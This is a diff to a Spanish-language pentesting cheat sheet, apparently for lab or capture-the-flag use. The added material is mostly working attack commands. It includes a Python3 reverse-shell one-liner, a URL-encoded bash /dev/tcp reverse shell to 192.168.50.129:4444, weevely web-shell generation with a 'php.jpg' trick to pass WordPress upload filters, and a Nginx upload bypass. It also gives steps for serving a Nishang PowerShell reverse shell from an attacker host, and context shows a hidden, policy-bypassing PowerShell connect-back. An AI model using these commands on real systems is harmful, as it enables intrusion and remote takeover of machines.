@@ -118,7 +118,7 @@ Nota:
 	1. Si se ejecuta el comando desde un 'cmd' en Windows colocarlo asi como aparece. Pero si se esta ejecutando desde la consola de PS quitarle 'powershell -c'
 ```
 
-## Revershell indetectable con Powershell utilizando Python
+## Revershell indetectable con Powershell utilizando Python 3
 
 ```bash 
 Nota: 
@@ -163,6 +163,14 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 'catch { Write-Host \\"[!] Error al conectar con el servidor del atacante: $_\\" -ForegroundColor Red } '
 '}; '
 'Connect-Back"')
+```
+
+## Revershell con Python3 
+
+```bash 
+❯ python3 ---version          # Verificar que este instalado python3 en la maquina victima 
+
+❯ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'  # Revershell 
 ```
 
 ## RCE MySQL
@@ -211,7 +219,7 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 ## Bypass Web Weevely
 
 ```bash 
-# Byppass en Nginx, subimos el archivo con la extension que permite subir, despues en la url lo cambiamos al formato php y ejecutamos los comandos 
+# Byppass en Nginx, subimos el archivo con la extension que permite subir, despues en la url lo cambiar al formato php y se puede ejecutar comandos 
 
 ❯ http://IP/uploads/shell.jpg/shell.php?cmd=whoami
 
@@ -219,17 +227,19 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 ```
 
 ```bash 
-# Otra forma de evadir la subida de archivos y obtener una Revershell 
+# Crear archivos de Revershell 
+❯ weevely generate password ~/Desktop/weevely.jpg    # Crear un archivo con la extensión que nos deja subir 
+❯ weevely generate password /root/shell.php.jpg      # Crear una revershell con extensión 'php.jpg' para pasar el filtro en WordPress de cargar imagenes 
+```
 
-❯ weevely generate password ~/Desktop/weevely.jpg     # Creamos un archivo con la extension que nos deja subir 
-❯ weevely https://IP/uploads/weevely.jpg/weevely.php password cmd   # Hara automaticamente una revershell con la peticion http request 
+```
+# Conectarse a Weevely
+❯ weevely https://IP/uploads/weevely.jpg/weevely.php password cmd   # Crear una revershell con la petición 'http request'
 	❯ :help                         # Muestra los comandos que podemos utilizar 
 	❯ :system_info                  # Muestra la info del sistema 
 
-❯ weevely https://IP/uploads/shell.php password           # Otra forma de conectarse a Weevely obteniendo la Revershell
+❯ weevely https://IP/uploads/shell.php password     # Otra forma de conectarse a Weevely obteniendo la Revershell
 	❯ ls                            # Listamos el contenido 
-
-❯ weevely generate password /root/shell.php.jpg           # Creamos una revershell con extension 'php.jpg' para pasar el filtro en WordPress de cargar imagenes 
 ```
 
 ## RCE en Web
@@ -299,6 +309,20 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 
 # Colocare la revershell en la web 
 ❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.129%2F4444%200%3E%261%27
+```
+
+```bash 
+# Para Windows se debe poder hacer injección de comandos en la web, esto se puede hacer:
+1. Con la carga de un archivo 'cmd.php'
+2. Buscar una parte de la web que ejecute comandos 
+
+# Hacer la Revershell
+1. Ejecutar el comando en powershell
+2. Crear el archivo llamado 'Ps.ps1' con el payload de la revershell 
+	1. https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+	2. Al final del payload colocar: 'Invoke-PowerShellTcp -Reverse -IPAddress 127.0.0.1 -Port 4444'
+3. Kali debe de compartir el PS.ps1 con 'python3 -m http.server 80' 
+4. Kali debe de escuchar con 'rlwrap nc -nlvp 4444' para Windows 
 ```
 
 ## Escucha Netcat 
